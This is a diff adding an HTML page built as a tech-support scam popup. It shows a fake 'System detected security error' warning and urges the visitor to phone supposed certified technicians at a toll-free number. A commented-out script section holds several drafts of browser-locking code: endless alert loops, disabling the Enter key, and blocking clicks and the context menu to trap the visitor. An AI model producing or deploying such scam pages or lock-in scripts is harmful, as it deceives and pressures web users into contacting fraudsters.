@@ -1,0 +1,131 @@
+<!doctype html>
+<html>
+  <head>
+    <title>The page says :</title>
+    <meta charset="utf-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    <!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script> -->
+    <style media="screen">
+      #page {
+        /*border: 1px solid #000;*/
+        height: 170px;
+        width: 446px;
+        background-color: #EDEDED;
+      }
+      #page img {
+        height: 60px;width: 60px;
+        padding: 5px;
+        display: inline;
+        float: left;
+      }
+      #page p {
+        margin: 0;
+        padding: 15px 5px;
+        text-align: justify;
+      }
+      #page button {
+        /*margin-left: 100px;*/
+        float: right;
+        margin: 10px;
+        padding: 5px 20px;
+      }
+      /*#page img, #page p {
+        display: inline;
+        float: left;
+        margin: 5px;
+      }*/
+    </style>
+  </head>
+  <body>
+    <div id="page">
+      <img src="images/error.png" alt="">
+      <p>System detected security error due to multiple attempts of suspicious activities. Please contact Live Certified Technicians for help at this number: 1-800-985-5266</p>
+      <button type="button" name="">OK</button>
+    </div>
+    <!--<script type="text/javascript">
+      while (1) {
+        alert('Error');
+      }
+      /*while (1) {
+        //var p = document.getElementById("page");
+        setInterval(loader() {
+          alert('Error!');
+        }, 1000);
+      }*/
+
+      /*while (1) {
+        alert('Error');
+        document.onkeydown = function(e) {
+        if(e.which == 13) {
+          return false;
+        }
+      }
+    } */
+
+
+
+    /*~~~~~~~~~~~~~~~~~*/
+    /* using jquery */
+
+    /*$(document).ready(function() {
+      while (1) {
+        alert('Error');}
+      $("html").bind("keypress", function(e) {
+        if(e.keyCode == 13) {
+          return false;
+        }
+      });
+    }); */
+
+  /*  $(document).ready(function() {
+
+      while (1) {
+        alert('Error');
+        var event = $(document).click(function(e) {
+          e.stopPropagation();
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          return false;
+        });
+
+        // disabling right click
+        $(document).bind('contextmenu', function(e) {
+          e.stopPropagation();
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          return false;
+        });
+        });
+      } */
+
+    /* using hook */
+
+  /*  function handleKeypress(e){
+      e = e || window.event ;
+      if (e == null){
+        return false;
+      }
+      if (e.keycode == 13){
+        CompleteEvent(e);
+      }
+    }
+    function CompleteEvent(e){
+      e.cancelBubble = true;
+      e.returnValue = false;
+    }
+
+    function setKeyHook() {
+      while (1) {
+        alert('Error');
+      }
+      var eventName = 'onkeydown';
+      var handlerFunc = handleKeypress;
+      body.detachEvent(eventName, handlerFunc);
+      body.attachEvent(eventName, handlerFunc);
+    }
+    onload = setKeyHook(); */
+      //loader();
+      /*~~~~hook over~~~~~~~~*/
+    </script> -->
+  </body>
+</html>
